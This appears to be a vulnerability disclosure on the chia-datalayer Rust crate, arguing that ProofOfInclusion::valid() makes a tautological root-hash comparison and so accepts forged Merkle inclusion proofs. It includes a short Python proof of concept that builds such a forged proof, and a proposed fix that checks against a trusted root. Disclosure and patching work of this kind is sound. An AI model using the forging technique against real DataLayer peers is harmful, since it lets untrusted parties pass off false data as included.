### Title
`ProofOfInclusion::valid()` Tautological Root-Hash Check Allows Forged DataLayer Inclusion Proofs - (File: `crates/chia-datalayer/src/merkle/proof_of_inclusion.rs`)

### Summary

`ProofOfInclusion::valid()` contains a tautological final comparison: after the loop sets `existing_hash` to the last layer's `combined_hash`, it compares that value against `self.root_hash()`, which also returns the last layer's `combined_hash`. The check is always `true` when layers are present. The function therefore only validates internal chain consistency and never validates the proof against any external trusted root hash. An attacker can construct a fully forged `ProofOfInclusion` — for any arbitrary `node_hash` — that passes `valid()`.

### Finding Description

`ProofOfInclusion::valid()` iterates over layers, verifying that each `combined_hash` equals `calculate_internal_hash(existing_hash, side, other_hash)`, and advances `existing_hash = calculated_hash`. After the loop, `existing_hash` holds the last layer's `combined_hash` (guaranteed by the in-loop check). The final line is:

```rust
existing_hash == self.root_hash()
```

`root_hash()` is:

```rust
pub fn root_hash(&self) -> Hash {
    if let Some(last) = self.layers.last() {
        last.combined_hash   // ← same value as existing_hash after the loop
    } else {
        self.node_hash
    }
}
```

When `layers` is non-empty, this is `last.combined_hash == last.combined_hash` — a tautology. When `layers` is empty, it is `self.node_hash == self.node_hash` — also a tautology. The function **never compares against any externally-supplied trusted root hash**.

`ProofOfInclusion` is fully deserializable from untrusted bytes via `from_bytes`, `from_bytes_unchecked`, `from_json_dict`, and `parse_rust`, all exposed through the Python wheel binding. An attacker can craft:

- `node_hash`: any leaf hash H they wish to prove is included
- `layers`: a chain where each `combined_hash` is correctly computed from the previous hash and an arbitrary `other_hash`

`valid()` returns `true` for this forged proof regardless of whether H exists in any real DataLayer tree.

### Impact Explanation

Any DataLayer consumer that calls `proof.valid()` to accept or reject a received `ProofOfInclusion` — without separately comparing `proof.root_hash()` against a trusted on-chain commitment — will accept forged inclusion proofs. This allows an untrusted peer to prove that an arbitrary key-value pair is present in a DataLayer store when it is not, corrupting the integrity guarantee of the DataLayer Merkle structure. This matches the allowed High impact: "DataLayer Merkle proof/blob/delta logic … lets untrusted input prove invalid state."

### Likelihood Explanation

`ProofOfInclusion` is a first-class serializable type exposed over the Python binding. The function is named `valid()` with no parameters, strongly implying it performs complete proof validation. Callers are likely to rely on it as the sole check. The struct's `from_bytes` / `from_json_dict` entry points are reachable from any unprivileged network peer that can send DataLayer proof data.

### Recommendation

`valid()` must accept an expected root hash parameter and compare `existing_hash` against it instead of against `self.root_hash()`:

```rust
pub fn valid_for_root(&self, expected_root: &Hash) -> bool {
    let mut existing_hash = self.node_hash;
    for layer in &self.layers {
        let calculated_hash = crate::calculate_internal_hash(
            &existing_hash,
            layer.other_hash_side,
            &layer.other_hash,
        );
        if calculated_hash != layer.combined_hash {
            return false;
        }
        existing_hash = calculated_hash;
    }
    &existing_hash == expected_root  // compare against external trusted root
}
```

The existing `valid()` method should be removed or deprecated to prevent misuse.

### Proof of Concept

```python
from chia_rs.datalayer import ProofOfInclusion, ProofOfInclusionLayer
import hashlib

# Arbitrary leaf hash we want to forge inclusion for
node_hash = bytes([0xAA] * 32)
other_hash = bytes([0xBB] * 32)

# Compute combined_hash exactly as calculate_internal_hash does (Side::Right)
# internal_hash = SHA256(b"\x02" + node_hash + other_hash)
h = hashlib.sha256(b"\x02" + node_hash + other_hash).digest()

layer = ProofOfInclusionLayer(
    other_hash_side=1,   # Side::Right
    other_hash=other_hash,
    combined_hash=h,
)

proof = ProofOfInclusion(node_hash=node_hash, layers=[layer])

# valid() returns True even though node_hash is not in any real tree
assert proof.valid() == True
# root_hash() returns h — attacker-controlled, not a trusted on-chain root
assert proof.root_hash() == h
```

**Root cause lines:** [1](#0-0) 

The tautological final comparison `existing_hash == self.root_hash()` where both sides resolve to `last.combined_hash`: [2](#0-1) 

The Python-binding entry points that allow untrusted deserialization of `ProofOfInclusion`: [3](#0-2) 

The `calculate_internal_hash` helper used by both the proof generator and the forger: [4](#0-3)

### Citations

**File:** crates/chia-datalayer/src/merkle/proof_of_inclusion.rs (L32-38)
```rust
    pub fn root_hash(&self) -> Hash {
        if let Some(last) = self.layers.last() {
            last.combined_hash
        } else {
            self.node_hash
        }
    }
```

**File:** crates/chia-datalayer/src/merkle/proof_of_inclusion.rs (L40-58)
```rust
    pub fn valid(&self) -> bool {
        let mut existing_hash = self.node_hash;

        for layer in &self.layers {
            let calculated_hash = crate::calculate_internal_hash(
                &existing_hash,
                layer.other_hash_side,
                &layer.other_hash,
            );

            if calculated_hash != layer.combined_hash {
                return false;
            }

            existing_hash = calculated_hash;
        }

        existing_hash == self.root_hash()
    }
```

**File:** wheel/python/chia_rs/datalayer.pyi (L236-266)
```text
@final
class ProofOfInclusion:
    node_hash: bytes32
    # children before parents
    layers: list[ProofOfInclusionLayer]

    def root_hash(self) -> bytes32: ...
    def valid(self) -> bool: ...

    def __new__(cls, node_hash: bytes32, layers: list[ProofOfInclusionLayer]) -> ProofOfInclusion: ...

    # TODO: generate
    def __hash__(self) -> int: ...
    def __repr__(self) -> str: ...
    def __deepcopy__(self, memo: object) -> Self: ...
    def __copy__(self) -> Self: ...
    @classmethod
    def from_bytes(cls, blob: bytes) -> Self: ...
    @classmethod
    def from_bytes_unchecked(cls, blob: bytes) -> Self: ...
    @classmethod
    def parse_rust(cls, blob: ReadableBuffer, trusted: bool = False) -> tuple[Self, int]: ...
    def to_bytes(self) -> bytes: ...
    def __bytes__(self) -> bytes: ...
    def stream_to_bytes(self) -> bytes: ...
    def get_hash(self) -> bytes32: ...
    def to_json_dict(self) -> dict[str, Any]: ...
    @classmethod
    def from_json_dict(cls, json_dict: dict[str, Any]) -> Self: ...
    def replace(self, *, node_hash: bytes32 = ..., layers: list[ProofOfInclusionLayer] = ...) -> Self: ...
    def truncate(self, field: str, length: int) -> None: ...
```

**File:** crates/chia-datalayer/src/merkle/blob.rs (L57-61)
```rust
pub fn calculate_internal_hash(hash: &Hash, other_hash_side: Side, other_hash: &Hash) -> Hash {
    match other_hash_side {
        Side::Left => internal_hash(other_hash, hash),
        Side::Right => internal_hash(hash, other_hash),
    }
```
